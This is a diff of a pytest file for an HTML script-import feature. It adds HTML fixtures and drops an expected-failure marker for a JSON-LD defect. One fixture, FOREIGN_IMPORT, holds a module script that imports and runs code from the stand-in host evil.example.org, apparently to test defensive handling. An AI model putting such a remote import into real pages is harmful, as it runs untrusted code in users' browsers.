@@ -11,8 +11,7 @@ DOCUMENTS = {
     "a_module_script": '<html><head><title>M</title></head><body><p>m</p><script type="module">const a = 1; window.mod = a;</script></body></html>',
 }
 FOREIGN_IMPORT = '<html><head><title>I</title></head><body><p>i</p><script type="module">import x from "https://evil.example.org/x.js"; x();</script></body></html>'
-JSON_LD_DEFECT = pytest.mark.xfail(strict=True, reason="TEST_PLAN 11 Scripts: the two import paths disagree on JSON-LD; Import HTML takes the first inline <script type=application/ld+json> as the section's JavaScript, the site import leaves it out")
-CASES = [pytest.param(name, marks=JSON_LD_DEFECT) if name.startswith("json_ld") else name for name in DOCUMENTS]
+CASES = list(DOCUMENTS)
 
 
 @pytest.fixture()
